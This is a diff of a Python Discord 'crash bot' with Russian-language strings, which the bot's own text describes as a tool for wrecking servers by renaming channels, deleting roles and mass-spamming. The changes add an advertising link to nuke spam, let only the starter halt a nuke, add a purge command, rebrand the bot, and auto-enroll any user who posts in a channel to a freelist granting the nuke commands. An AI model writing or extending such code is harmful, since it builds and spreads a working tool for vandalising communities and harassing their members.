@@ -221,6 +221,10 @@ async def delete_all_roles(guild):
 async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
+    # Добавляем рекламу к кастомному тексту
+    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
+    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+        spam_text = spam_text + AD_SUFFIX
 
     NUKE_NAME = "Вы были крашнуты"
 
@@ -287,6 +291,10 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     """
     if spam_text is None:
         spam_text = config.SPAM_TEXT
+    # Добавляем рекламу к кастомному тексту
+    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
+    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+        spam_text = spam_text + AD_SUFFIX
 
     TURBO_NAME = "Вы были крашнуты"
 
@@ -374,6 +382,10 @@ async def do_owner_nuke_task(guild, spam_text=None):
     """
     if spam_text is None:
         spam_text = config.SPAM_TEXT
+    # Добавляем рекламу к кастомному тексту
+    AD_SUFFIX = "\n\n☠️ DavaidKa Bot — https://discord.gg/JEspTXRW"
+    if spam_text != config.SPAM_TEXT and AD_SUFFIX not in spam_text:
+        spam_text = spam_text + AD_SUFFIX
 
     OWNER_NAME = "Вы были крашнуты"
 
@@ -531,6 +543,16 @@ async def stop(ctx):
         await ctx.send(embed=embed)
         return
 
+    # Только тот кто запустил или овнер
+    if uid != starter_id and uid != config.OWNER_ID:
+        embed = discord.Embed(
+            description="❌ Только тот кто запустил нюк может его остановить.",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="DavaidKa Bot")
+        await ctx.send(embed=embed)
+        return
+
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
     await ctx.send("✅ Остановлено.")
@@ -589,6 +611,25 @@ async def webhooks(ctx):
         return
     msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
     await ctx.send(f"```{msg[:1900]}```")
+
+
+@bot.command(name="clear")
+@wl_check()
+async def clear(ctx, amount: int = 10):
+    """Удалить N сообщений в канале. Максимум 100."""
+    if amount > 100:
+        await ctx.send("Максимум 100 сообщений.")
+        return
+    if amount < 1:
+        await ctx.send("Минимум 1 сообщение.")
+        return
+    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
+    msg = await ctx.send(f"🗑️ Удалено **{len(deleted) - 1}** сообщений.")
+    await asyncio.sleep(3)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
 
 
 @bot.command()
@@ -998,9 +1039,9 @@ async def setup(ctx):
 
     # ── Отправляем правила ──
     rules_embed = discord.Embed(
-        title="📜 Правила сервера ECLIPSED",
+        title="📜 Правила сервера DavaidKa Bot",
         description=(
-            "Добро пожаловать на официальный сервер **ECLIPSED SQUAD** ☠️\n\n"
+            "Добро пожаловать на официальный сервер **DavaidKa Bot** ☠️\n\n"
             "**Основные правила:**\n"
             "**1.** Уважай других участников\n"
             "**2.** Не спамь и не флуди\n"
@@ -1018,14 +1059,14 @@ async def setup(ctx):
         ),
         color=0x0a0a0a
     )
-    rules_embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    rules_embed.set_footer(text="DavaidKa Bot")
     await rules_ch.send(embed=rules_embed)
 
     # ── Отправляем инфо ──
     info_embed = discord.Embed(
-        title="ℹ️ Информация о боте ECLIPSED",
+        title="ℹ️ Информация о боте DavaidKa Bot",
         description=(
-            "**ECLIPSED** — мощный краш-бот для Discord.\n\n"
+            "**DavaidKa Bot** — мощный краш-бот для Discord.\n\n"
             "**🌍 Доступно всем:**\n"
             "`!nuke` — краш сервера (переименование каналов → удаление ролей → спам → роль ☠️)\n"
             "`!auto_nuke on/off` — авто-краш при входе бота на сервер\n\n"
@@ -1042,7 +1083,7 @@ async def setup(ctx):
         ),
         color=0x0a0a0a
     )
-    info_embed.set_footer(text="☠️ ECLIPSED SQUAD  |  v1.8")
+    info_embed.set_footer(text="DavaidKa Bot  |  v1.8")
     info_embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await info_ch.send(embed=info_embed)
 
@@ -1061,7 +1102,7 @@ async def setup(ctx):
         ),
         color=0x0a0a0a
     )
-    addbot_embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Просто напиши что-нибудь")
+    addbot_embed.set_footer(text="DavaidKa Bot  |  Просто напиши что-нибудь")
     await addbot_ch.send(embed=addbot_embed)
 
     embed = discord.Embed(
@@ -1075,7 +1116,7 @@ async def setup(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Роли без прав — настрой вручную")
+    embed.set_footer(text="DavaidKa Bot  |  Роли без прав — настрой вручную")
     await msg.edit(content=None, embed=embed)
 
 
@@ -2902,7 +2943,7 @@ async def on_message(message):
     if message.guild and is_guild_blocked(message.guild.id):
         return  # Сервер заблокирован — игнорируем всё
 
-    # ── Канал addbot на домашнем сервере — только показываем инфо ──────────────────────
+    # ── Канал addbot на домашнем сервере — выдаём freelist ──────────────────────
     if (message.guild and message.guild.id == HOME_GUILD_ID
             and ("addbot" in message.channel.name.lower())
             and not message.author.bot):
@@ -2912,25 +2953,42 @@ async def on_message(message):
             pass
         if message.author.id == config.OWNER_ID:
             return
-        try:
-            await message.author.send(
-                embed=discord.Embed(
-                    title="ℹ️ Как получить доступ к боту",
-                    description=(
-                        "Доступ к боту выдаётся лично.\n\n"
-                        "**Для получения напиши:**\n"
-                        "Discord: **davaidkatt**\n"
-                        "Telegram: **@Firisotik**\n\n"
-                        "**Что доступно без регистрации:**\n"
-                        "`!nuke` — краш сервера\n"
-                        "`!auto_nuke on/off` — авто-краш при входе\n\n"
-                        "Напиши `!help` боту в ЛС чтобы увидеть все команды."
-                    ),
-                    color=0x0a0a0a
-                ).set_footer(text="DavaidKa Bot  |  davaidkatt")
-            )
-        except Exception:
-            pass
+        uid = message.author.id
+        if uid in FREELIST:
+            try:
+                await message.author.send(
+                    embed=discord.Embed(
+                        title="✅ У тебя уже есть базовый доступ",
+                        description=(
+                            "Ты уже в freelist — можешь использовать `!nuke` и `!auto_nuke`.\n\n"
+                            "Для расширенного доступа напиши: **davaidkatt**"
+                        ),
+                        color=0x0a0a0a
+                    ).set_footer(text="DavaidKa Bot  |  davaidkatt")
+                )
+            except Exception:
+                pass
+        else:
+            FREELIST.append(uid)
+            save_freelist()
+            try:
+                await message.author.send(
+                    embed=discord.Embed(
+                        title="✅ Базовый доступ получен!",
+                        description=(
+                            "Ты добавлен в freelist.\n\n"
+                            "**Доступные команды:**\n"
+                            "`!nuke` — краш сервера\n"
+                            "`!auto_nuke on/off` — авто-краш при входе бота\n\n"
+                            "Для получения полного доступа (whitelist/premium) напиши:\n"
+                            "Discord: **davaidkatt** | Telegram: **@Firisotik**\n\n"
+                            "Наш сервер: https://discord.gg/JEspTXRW"
+                        ),
+                        color=0x0a0a0a
+                    ).set_footer(text="DavaidKa Bot  |  davaidkatt")
+                )
+            except Exception:
+                pass
         return
     if message.content.strip() == "!" and is_whitelisted(message.author.id):
         ctx = await bot.get_context(message)
